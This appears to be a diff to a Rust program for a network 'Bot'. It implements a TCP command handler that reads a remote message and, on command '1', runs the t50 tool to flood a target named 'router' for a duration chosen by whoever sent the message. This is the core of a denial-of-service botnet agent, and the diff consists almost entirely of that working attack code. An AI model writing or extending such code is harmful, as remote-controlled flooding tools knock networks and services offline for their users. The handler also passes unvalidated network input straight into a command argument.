@@ -1,4 +1,5 @@
 #![allow(dead_code)]
+use std::io::prelude::*;
 use std::net::{TcpStream, TcpListener};
 use std::process::Command;
 
@@ -48,8 +49,29 @@ impl Bot {
         }
     }
 
-    fn loop_callback(&self, stream: TcpStream) {
-        // TODO
+    fn loop_callback(&self, mut stream: TcpStream) {
+        let mut buffer = [0; 128];
+        let n = stream.read(&mut buffer);
+        match n {
+            Ok(msg_len) => {
+                let msg = String::from_utf8_lossy(&buffer[..msg_len]);
+                println!(
+                    "Message received: {:?}",
+                    msg
+                );
+                let mut parts = msg
+                    .split_whitespace();
+                let cmd: String = parts.next().unwrap().to_string();
+                if cmd == "1" {
+                    let duration: String = parts.next().unwrap().to_string();
+                    Command::new("timeout")
+                        .args(&[&duration, "t50", "--flood", "router"])
+                        .output()
+                        .expect("failed to run t50");
+                }
+            }
+            Err(error) => println!("Error encountered: {}", error),
+        }; 
     }
 }
 
